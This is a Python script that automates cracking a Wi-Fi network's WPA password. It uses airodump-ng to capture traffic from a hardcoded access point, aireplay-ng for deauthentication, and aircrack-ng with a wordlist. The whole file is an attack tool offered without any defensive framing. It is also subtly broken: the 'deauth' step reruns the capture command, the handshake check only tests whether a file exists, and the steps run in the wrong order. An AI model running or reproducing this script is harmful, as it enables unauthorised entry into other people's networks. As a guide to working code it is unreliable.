import subprocess, os, time

# Variables
bssid = "00:5F:67:7D:C6:A1"
channel = "3"
cap_name = "test"
interface = "wlp1s0"

# Commands
capture = f"airodump-ng -c {channel} --bssid {bssid} -w /root/aircrack/{cap_name} {interface}mon"
deauth = f"aireplay-ng -0 1 -a {bssid} {interface}mon"
crack = f"aircrack-ng -w /root/wordlist.txt -b {bssid} /root/aircrack/{cap_name}-01.cap"


# Run command1 in the background
capture_process = subprocess.Popen(capture, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def has_handshake():
    # Check the file where airodump-ng writes the capture
    capture_file = f"/root/aircrack/{cap_name}-01.cap"
    return os.path.isfile(capture_file)

# Wait until handshake is captured
print("Waiting for handshake...")
while not has_handshake():
    time.sleep(1)
print("Handshake captured!")

# Terminate the airodump-ng process if necessary
capture_process.terminate()

# Run command2 in the background
deauth_process = subprocess.Popen(capture, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# Wait for command2 to complete
deauth_process.wait()

# After both commands are done, run command3
subprocess.run(crack, shell=True)